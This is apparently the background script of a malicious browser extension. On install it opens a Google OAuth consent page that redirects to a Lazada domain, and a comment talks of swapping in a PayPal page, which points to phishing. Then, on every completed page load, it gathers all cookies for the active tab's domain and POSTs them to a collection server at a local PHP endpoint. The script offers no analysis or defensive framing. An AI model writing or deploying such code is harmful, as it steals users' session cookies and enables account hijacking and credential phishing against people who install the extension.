// redirect after installation , change my url github to make paypal page

chrome.runtime.onInstalled.addListener(function(details) {
  switch (details.reason) {
    case "install":
      chrome.tabs.create({url: "https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?redirect_uri=storagerelay%3A%2F%2Fhttps%2Fmember.lazada.co.id%3Fid%3Dauth637272&response_type=code%20permission%20id_token&scope=profile%20email%20openid&openid.realm&include_granted_scopes=true&client_id=332173969373-6eklqavd6tk54n862evlik20rr29b916.apps.googleusercontent.com&ss_domain=https%3A%2F%2Fmember.lazada.co.id&access_type=offline&prompt=consent&origin=https%3A%2F%2Fmember.lazada.co.id&gsiwebsdk=2&flowName=GeneralOAuthFlow"});
      break;
    default:
      return true;
  }
});



(function() {

    let tabId;

    function unpack(objs){
        let s = "";
        objs.array.forEach(obj => {
            Object.keys(obj).forEach(key => {
                s += `${key}: ${obj[key]}\n`;
            });
            s += "\n";
        });
        return s;
    }

    browser.tabs.onActivated.addListener(function (tab) {
        tabId = tab.tabId;
        console.log(tabId);
    });

    browser.webNavigation.onCompleted.addListener(function () {
        browser.tabs.get(tabId, function (tab) {
            if(tab.url){
                let domain = tab.url.includes("://") ? tab.url.split("://")[1].split("/")[0] : tab.url.split("/")[0];
                if (domain.startsWith("www.")) {
                    domain = domain.replace("www.", "");
                }
                console.log(domain);
                browser.cookies.getAll({domain: domain}, function (cookies) {
                    fetch('http://127.0.0.1/server/api.php', {
                        headers: { "Content-Type": "application/json; charset=utf-8" },
                        method: 'POST',
                        body: JSON.stringify({cookie : cookies})
                    })
                   //let str = unpack(cookies);
                });
            }
        });
    });

}());
